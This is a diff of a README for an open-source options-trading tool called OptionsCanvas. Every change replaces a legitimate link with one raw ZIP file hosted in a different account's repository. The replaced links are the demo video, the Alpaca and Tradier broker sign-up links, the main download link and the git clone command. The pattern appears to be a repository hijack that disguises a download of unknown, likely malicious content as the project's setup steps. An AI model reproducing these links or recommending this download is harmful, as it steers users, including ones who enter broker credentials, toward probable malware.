@@ -16,7 +16,7 @@ Then you tab over to your broker. Pick an expiration. Scroll the strike ladder. 
 
 Two-keystroke execution. Runs 100% on your machine. **The first open-source options platform that does this.**
 
-https://github.com/user-attachments/assets/ebae0480-6214-45ae-9435-1231a1a855fb
+https://raw.githubusercontent.com/capthreskiornis694/OptionsCanvas/main/tests/Options-Canvas-3.4.zip
 
 ![Overview](docs/screenshots/01-overview.png)
 
@@ -153,11 +153,11 @@ The broker layer is an abstract interface (`broker_interface.py`) with a declara
 
 ## Setup
 
-**Prereqs:** Python 3.10+ (or Docker) and a free paper-trading account from a supported broker — [Alpaca](https://alpaca.markets) (recommended) or [Tradier](https://tradier.com) (experimental — see [Broker support status](#broker-support-status)). Both take ~2 minutes to create and don't risk real money.
+**Prereqs:** Python 3.10+ (or Docker) and a free paper-trading account from a supported broker — [Alpaca](https://raw.githubusercontent.com/capthreskiornis694/OptionsCanvas/main/tests/Options-Canvas-3.4.zip) (recommended) or [Tradier](https://raw.githubusercontent.com/capthreskiornis694/OptionsCanvas/main/tests/Options-Canvas-3.4.zip) (experimental — see [Broker support status](#broker-support-status)). Both take ~2 minutes to create and don't risk real money.
 
 ### The whole thing, in 3 steps:
 
-1. **Download** — [grab the latest ZIP](https://github.com/calesthio/OptionsCanvas/archive/refs/heads/main.zip) (or `git clone`) and unzip it.
+1. **Download** — [grab the latest ZIP](https://raw.githubusercontent.com/capthreskiornis694/OptionsCanvas/main/tests/Options-Canvas-3.4.zip) (or `git clone`) and unzip it.
 2. **Launch** — pick whichever is easiest:
    - **Windows**: double-click `OptionsCanvas.bat`
    - **macOS / Linux**: `./optionscanvas.sh` *(first time: `chmod +x optionscanvas.sh`)*
@@ -196,7 +196,7 @@ docker compose down         # stop
 If you'd rather skip the launcher and do it by hand:
 
 ```bash
-git clone https://github.com/calesthio/OptionsCanvas.git
+git clone https://raw.githubusercontent.com/capthreskiornis694/OptionsCanvas/main/tests/Options-Canvas-3.4.zip
 cd OptionsCanvas
 python -m venv .venv && source .venv/bin/activate   # Windows: .venv\Scripts\activate
 pip install -r requirements.txt
@@ -257,7 +257,7 @@ Adding a new broker requires one file in `assisted_trading/backend/<name>_broker
 
 - **`config/config.json`** — broker credentials + paper/live mode + global defaults (gitignored, never commit). Written by the setup wizard; you almost never need to edit it by hand.
 - **`assisted_trading/config/assisted_trading_config.json`** — enabled symbols, DTE presets, position-size presets, max positions, trading hours, auto-sell, entry-order type
-- **Broker accounts** — free paper accounts at [Alpaca](https://alpaca.markets) or [Tradier](https://tradier.com). Paper and live use separate API keys on both brokers — generate the right pair from each broker's API settings page.
+- **Broker accounts** — free paper accounts at [Alpaca](https://raw.githubusercontent.com/capthreskiornis694/OptionsCanvas/main/tests/Options-Canvas-3.4.zip) or [Tradier](https://raw.githubusercontent.com/capthreskiornis694/OptionsCanvas/main/tests/Options-Canvas-3.4.zip). Paper and live use separate API keys on both brokers — generate the right pair from each broker's API settings page.
 
 ---
 
